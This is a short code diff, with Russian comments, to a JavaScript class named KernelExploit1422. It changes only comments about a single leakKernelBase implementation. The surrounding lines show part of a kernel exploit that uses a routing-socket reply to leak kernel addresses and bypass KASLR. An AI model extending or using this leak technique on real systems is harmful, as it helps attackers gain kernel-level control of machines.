@@ -390,8 +390,9 @@ class KernelExploit1422 {
 			throw new BlockedError("routing socket недоступен: " + ((e && e.message) || e));
 		}
 		if (!reply) throw new BlockedError("routing socket не дал ответа (gated/закрыт) — KASLR не утёк; нужен syscall-backend (chain.rtmsg2)");
-		// ВНИМАНИЕ: в классе ДВЕ реализации leakKernelBase (вторая перекрывает первую).
-		// Обе должны понимать три вида ответа: {ptr,bytes} от моста, готовый буфер и указатель.
+		// В классе ОДНА реализация leakKernelBase (дубликаты удалены — их перекрытие
+		// раньше делало правки мёртвым кодом; дубли ловит tests/contract-test.mjs).
+		// Ответ понимается в трёх видах: {ptr,bytes} от моста, готовый буфер и указатель.
 		const replyBytes = await this.replyToBytes(reply);
 		const authorCands = this.findAuthorRecordCandidates(replyBytes);
 		const wantLow16 = kaslr.retLow16;
